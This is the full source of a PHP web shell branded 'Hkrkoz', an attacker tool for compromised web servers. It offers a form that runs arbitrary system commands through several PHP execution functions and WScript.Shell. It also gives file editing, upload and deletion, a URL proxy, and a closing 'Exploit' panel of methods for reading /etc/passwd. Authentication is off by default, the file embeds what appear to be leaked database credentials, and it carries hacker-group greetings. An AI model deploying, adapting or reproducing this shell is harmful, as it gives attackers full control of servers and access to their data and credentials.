<?php
/******************************************************************************************************/
/*  hkrkoz.php - wWw.Hkrkoz.cOm
/*  гдЩгЙ еЯСЯжТ бЬ еЯС ЗбЪСИн: http://wWw.Hkrkoz.cOm
/*  by: 1.0 (03.10.2006)
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  Кг жЦЪ ЗбНгЗне ИУ ЗбФЗШС нЭКНеЗ Уебе HkRkoz ЗбТЪнг
/*
/*  by Hkrkoz@Hkrkoz.com ЗбФЯС ббе жНПе жЗбФЯС ббМгнЪ ЗбЪСИ
/******************************************************************************************************/
/* ~~~ ЗбОнЗСЗК | ЗбОнЗСЗК  ~~~ */

// бКФЫнб гнТЙ ЗбСЮг ЗбУСн Зж КЪШнбе | Authentification
// $auth = 0; - ЗбСЮг жЗНП бКФЫнб ЗбСЮг ЗбУСн  ( authentification = On  )
// $auth = 0; - ЗбСЮг ХЭС бКЪШнб ЗбСЮг ЗбУСн ( authentification = Off )
$auth = 0;

//  (Login & Password for access)
// !!! (CHANGE THIS!!!)
//  md5, ЗбИЗУжСП жЗбнжТС нКг КФЭнСег ИЬЬ 'Hkrkoz'
// Login & password crypted with md5, default is 'Hkrkoz'
$name='7c7f0f5f0f9e774ec437e1077e6c84a7'; // ЗбнжТС ЗбгФЭС  (user login)
$pass='7c7f0f5f0f9e774ec437e1077e6c84a7'; // ЗбИЗУжСП ЗбгФЭС (user password)
/******************************************************************************************************/
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="жнд СЗнН нЗбРнИї бЗ нЯжд КЮФС ИХб ееееее"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://wWw.Hkrkoz.cOm></a> : ЗбПОжб бЬ еЯСЯжТ ЗбЯжнК ЭЮШ :)</b>");
   }
}
?>


<html>
<head>
<title>*  Hkrkoz  * </title>
<body bgcolor="#000000">
<table Width='100%' height='10%' bgcolor='#AA0000' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> HkRkoz ALKuwaiT</font></center></td>
</tr>
</table>
<style type="text/css">
body, td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: 1px solid #666666 none;
	padding-left: "2px"
}
.redfont {
	COLOR: "#A60000";
}
a:link, a:visited, a:active {
	color: "#FF0000";
	text-decoration: underline;
}
a:hover {
	color: "#FFFFFF";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#AA0000"}
.firstalt {BACKGROUND-COLOR: "#000000"}
.secondalt {BACKGROUND-COLOR: "#000000"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body>
<center>

<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?PHP



error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}
$mohajer =  getcwd();
$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");

///////////////////////////////
                             //
$mysql_use = "no"; //"yes"   //
$mhost = "localhost";        //
$muser = "ootcom_vb";       //
$mpass = "9ootcom";               //
$mdb = "ootcom_vb";         //
                             //
///////////////////////////////


if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}



if (empty($_POST['phpinfo'] )) {
	}else{
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
	exit;
}


if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>»сИЎ URL ДЪИЭК§°Ь</b></p></center></body>";
	exit;
}

if  (empty($_POST['Hkrkoz'] ) ) {
	}ELSE{
	$action = '?action=Hkrkoz';
	echo "<table Width='100%' height='10%' bgcolor='#000000' border='1'><tr><td><center><font size='6' color='#BBB516'>
еЯСЯжТ ЗбЯжнК <br><br>
Shap7_haCker <br><br>
X-MeN HaCeR <br><br>
BAD^BOY <br><br>
ЗбУЭСЗдн <br><br>
IRAQE <br><br>
Hell Scream <br><br>
JUBA <br><br>
ЗМСЗЗЗг гЗЭнЗЗЗЗ <br><br>
ЗбжбеЗЗЗЗЗЗд<br><br>
Sniper Syria <br><br>
GeRNaS <br><br>
УжСн жЗЭКОС <br><br>
НЮжЮ ЗбдФС гУгжНе <br><br>
WWW.Hkrkoz.CoM/vb <br><br>
ЗбЮЗПг ЗМгб Фнб еЯСЯжТ ЗбЯжнК <br><br>";
  

    echo "</font></center></td></tr></table> ";

	exit;
	}
if  (empty($_POST['command'] ) ) {
	}ELSE{
	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";

		echo "</form>\n";
	}
$tb = new FORMS;

$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td><b>'.$mohajer.'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody("<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='Hkrkoz' value='КЪСЭ Ъбм ЗбЮЗЖге бГЪЦЗБ'  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>");
$tb->tablefooter();
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>command [ system , shell_exec , passthru , Wscript.Shell , exec , popen ]</b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');

$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');
$tb->headerform(array('content'=>'<FONT COLOR=RED>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' '.$tb->makeinput('command').' '.$tb->makeinput('Run','command','','submit')));

	echo"<tr class='secondalt'><td align='center'><textarea name='textarea' cols='100' rows='25' readonly>";

        if  ($_POST['command'] )  {

		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} else {
			system($_POST['command']);
		}

	}

echo"</textarea></td></tr></form></table>";
		exit;
}//end shell

if ($_POST['editfile']){
$fp = fopen($_POST['editfile'], "r");
$filearr = file($_POST['editfile']);

foreach ($filearr as $string){

$content = $content . $string;
}

echo "<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUEST_URI' method='POST'><textarea name=content cols=122 rows=20>";echo htmlentities($content); echo"</textarea>";
echo"<input type='hidden' name='dir' value='" . getcwd() ."'>
<input type='hidden' name='savefile' value='{$_POST['editfile']}'><br>
<input type='submit' name='submit' value='Save'></form></center>";

fclose($fp);
}


if($_POST['savefile']){

$fp = fopen($_POST['savefile'], "w");
$content = stripslashes($content);
fwrite($fp, $content);
fclose($fp);
echo "<center><div id=logostrip>Successfully saved!</div></center>";

}
if ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "ЙПґ«іЙ№¦!" : "ЙПґ«К§°Ь!";
}


elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "can't make dir";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "ok" : "";
			@chmod("$mkdirs",0777);
		}
	}
}

/////////
$pathname=str_replace('\\','/',dirname(__FILE__));

////////
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_post['dir'];
	$nowpath = getPath($pathname, $dir);
}

///////
$dir_writeable = (dir_writeable($nowpath)) ? "m" : "mm";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\"mohajer22</a>" : "";

$tb = new FORMS;

$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td><b>'.$mohajer.'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody("<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='Hkrkoz' value='КЪСЭ Ъбм ЗбЮЗЖге бГЪЦЗБ'  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>");
$tb->tablefooter();
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Editfile or make & Uploud file & Make directory</b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');
$tb->headerform(array('content'=>'<FONT COLOR=RED>File to edit or make:</FONT>'.$tb->makehidden('dir',  getcwd()  ).' '.$tb->makeinput('editfile').' '.$tb->makeinput('Edit','editfile','','submit')));


$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'<FONT COLOR=RED>Uploud file:</FONT>'.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','up','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('content'=>'<FONT COLOR=RED>Make directory:</FONT> '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','newdirectory','','submit')));
$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');
$tb->headerform(array('content'=>'<FONT COLOR=RED>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' '.$tb->makeinput('command').' '.$tb->makeinput('Run','command','','submit')));

$tb->tdbody ("</td></tr></table>");
if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {


	$tb->tableheader();
echo"<tr bgcolor='#AA0000'><td align='center' nowrap width='27%'><b>DIR</b></td><td align='center' nowrap width='16%'><b>First data</b></td><td align='center' nowrap width='16%'><b>Last data</b></td><td align='center' nowrap width='11%'><b>Size</b></td><td align='center' nowrap width='6%'><b>Perm</b></td></tr>";

$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$ctime</span></td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$mtime</span></td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">&lt;dir&gt;</span></td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$dirperm</span></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">Up dir</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs);

echo"<tr bgcolor='#cccccc'><td colspan='6' height='5'></td></tr><FORM  method='POST'>";

$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
        if  ($file == 'config.php') {

        echo "<a href=\"$filepath\" target=\"_blank\"><font color='yellow'>$file<STRONG></STRONG></a></td>\n";
        }
        echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$ctime</span></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$mtime</span></td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">$fileperm</span></td>\n";
		echo "</tr>\n";
		$file_i++;


	}
}// while
@closedir($dirs);

echo "</FORM>\n";
echo "</table>\n";
}// end dir







	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}


	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}


	function deltree($deldir) {
		$mydir=@dir($deldir);
		while($file=$mydir->read())	{
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) {
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file");
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		}
		$mydir->close();
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	}


	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}


	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}


	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		}
		return implode('/', $mainpath_info);
	}


	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}


	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}


	class PHPZip{
	var $out='';
		function PHPZip($dir)	{
    		if (@function_exists('gzcompress'))	{
				$curdir = getcwd();
				if (is_array($dir)) $filelist = $dir;
		        else{
			        $filelist=$this -> GetFileList($dir);//ОДјюБР±н
				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
	            }
		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
				else chdir($curdir);
				if (count($filelist)>0){
					foreach($filelist as $filename){
						if (is_file($filename)){
							$fd = fopen ($filename, "r");
							$content = @fread ($fd, filesize ($filename));
							fclose ($fd);
						    if (is_array($dir)) $filename = basename($filename);
							$this -> addFile($content, $filename);
						}
					}
					$this->out = $this -> file();
					chdir($curdir);
				}
				return 1;
			}
			else return 0;
		}


		function GetFileList($dir){
			static $a;
			if (is_dir($dir)) {
				if ($dh = opendir($dir)) {
			   		while (($file = readdir($dh)) !== false) {
						if($file!='.' && $file!='..'){
            				$f=$dir .'/'. $file;
            				if(is_dir($f)) $this->GetFileList($f);
							$a[]=$f;
	        			}
					}
     				closedir($dh);
    			}
			}
			return $a;
		}

		var $datasec      = array();
	    var $ctrl_dir     = array();
		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	    var $old_offset   = 0;

		function unix2DosTime($unixtime = 0) {
	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		    if ($timearray['year'] < 1980) {
				$timearray['year']    = 1980;
        		$timearray['mon']     = 1;
	        	$timearray['mday']    = 1;
		    	$timearray['hours']   = 0;
				$timearray['minutes'] = 0;
        		$timearray['seconds'] = 0;
	        } // end if
		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	    }

		function addFile($data, $name, $time = 0) {
	        $name     = str_replace('\\', '/', $name);

		    $dtime    = dechex($this->unix2DosTime($time));
	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
		              . '\x' . $dtime[4] . $dtime[5]
			          . '\x' . $dtime[2] . $dtime[3]
				      . '\x' . $dtime[0] . $dtime[1];
	        eval('$hexdtime = "' . $hexdtime . '";');
		    $fr   = "\x50\x4b\x03\x04";
			$fr   .= "\x14\x00";
	        $fr   .= "\x00\x00";
		    $fr   .= "\x08\x00";
			$fr   .= $hexdtime;

	        $unc_len = strlen($data);
		    $crc     = crc32($data);
			$zdata   = gzcompress($data);
	        $c_len   = strlen($zdata);
		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
			$fr      .= pack('V', $crc);
	        $fr      .= pack('V', $c_len);
		    $fr      .= pack('V', $unc_len);
			$fr      .= pack('v', strlen($name));
	        $fr      .= pack('v', 0);
		    $fr      .= $name;

			$fr .= $zdata;

	        $fr .= pack('V', $crc);
		    $fr .= pack('V', $c_len);
			$fr .= pack('V', $unc_len);

	        $this -> datasec[] = $fr;
		    $new_offset        = strlen(implode('', $this->datasec));

			$cdrec = "\x50\x4b\x01\x02";
	        $cdrec .= "\x00\x00";
		    $cdrec .= "\x14\x00";
			$cdrec .= "\x00\x00";
	        $cdrec .= "\x08\x00";
		    $cdrec .= $hexdtime;
			$cdrec .= pack('V', $crc);
	        $cdrec .= pack('V', $c_len);
		    $cdrec .= pack('V', $unc_len);
			$cdrec .= pack('v', strlen($name) );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('v', 0 );
			$cdrec .= pack('v', 0 );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('V', 32 );
			$cdrec .= pack('V', $this -> old_offset );
	        $this -> old_offset = $new_offset;
		    $cdrec .= $name;

			$this -> ctrl_dir[] = $cdrec;
	    }

		function file() {
			$data    = implode('', $this -> datasec);
	        $ctrldir = implode('', $this -> ctrl_dir);
		    return
			    $data .
				$ctrldir .
	            $this -> eof_ctrl_dir .
		        pack('v', sizeof($this -> ctrl_dir)) .
			    pack('v', sizeof($this -> ctrl_dir)) .
				pack('V', strlen($ctrldir)) .
	            pack('V', strlen($data)) .
		        "\x00\x00";
	    }
	}

	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);

		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">·mohajer</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";

			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">·µ»Ш</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}
        function makeid($name,$value='',$extra='',$type='select',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<select name=plugin><option>cat /etc/passwd</option></select>";
			return $input;
		}
		 function makeimp($name,$value='',$extra='',$type='select',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>";
			return $input;
		}
		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value='mohajer'></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}



$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: read file [SQL , id , CURL , copy , ini_restore , imap]    & Make file ERORR</b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');


$tb->headerform(array('content'=>'<FONT COLOR=RED>read file SQL:</FONT><br>' .$tb->makeinput('Mohajer22','/etc/passwd' ).$tb->makeinput('',Show,'Mohajer22','submit')));
$tb->headerform(array('content'=>'<FONT COLOR=RED>read file id:</FONT><br>' .$tb->makeid('plugin','cat /etc/passwd' ).$tb->makeinput('',Show,'plugin','submit')));
$tb->headerform(array('content'=>'<FONT COLOR=RED>read file CURL:</FONT><br>' .$tb->makeinput('curl','/etc/passwd' ).$tb->makeinput('',Show,'curl','submit')));
$tb->headerform(array('content'=>'<FONT COLOR=RED>read file copy:</FONT><br>' .$tb->makeinput('copy','/etc/passwd' ).$tb->makeinput('',Show,'copy','submit')));
$tb->headerform(array('content'=>'<FONT COLOR=RED>read file ini_restore:</FONT><br>' .$tb->makeinput('M2','/etc/passwd' ).$tb->makeinput('',Show,'M2','submit')));
$tb->headerform(array('content'=>'<FONT COLOR=RED>read file or dir with imap:</FONT><br>' .$tb->makeimp('switch','/etc/passwd' ).$tb->makeinput('string','/etc/passwd' ).$tb->makeinput('string','Show','','submit')));
